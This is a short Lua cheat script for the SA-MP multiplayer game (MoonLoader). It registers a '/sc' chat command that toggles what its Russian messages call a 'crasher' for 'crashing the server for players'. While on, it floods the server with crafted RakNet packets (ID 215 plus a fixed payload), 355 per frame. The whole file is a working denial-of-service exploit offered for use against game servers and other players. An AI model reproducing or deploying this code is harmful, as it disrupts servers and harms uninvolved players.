local state = false
function main()
    repeat wait(0) until isSampAvailable()
    sampRegisterChatCommand('sc', function()
	sampAddChatMessage(state and "Выключили крашер" or "Крашим сервер игрокам...", -1)
        state = not state
    end)
    while true do
        wait(0)
        if state then
            for i = 1, 355 do
                Lol()
            end
        end
    end
end
function Lol()
    local bs = raknetNewBitStream()
    local crs = {29, 0, 1, 0, 0, 0}
    raknetBitStreamWriteInt8(bs, 215)
    for i = 1, #crs do
        raknetBitStreamWriteInt8(bs, crs[i])
    end
    raknetSendBitStream(bs)
    raknetDeleteBitStream(bs)
end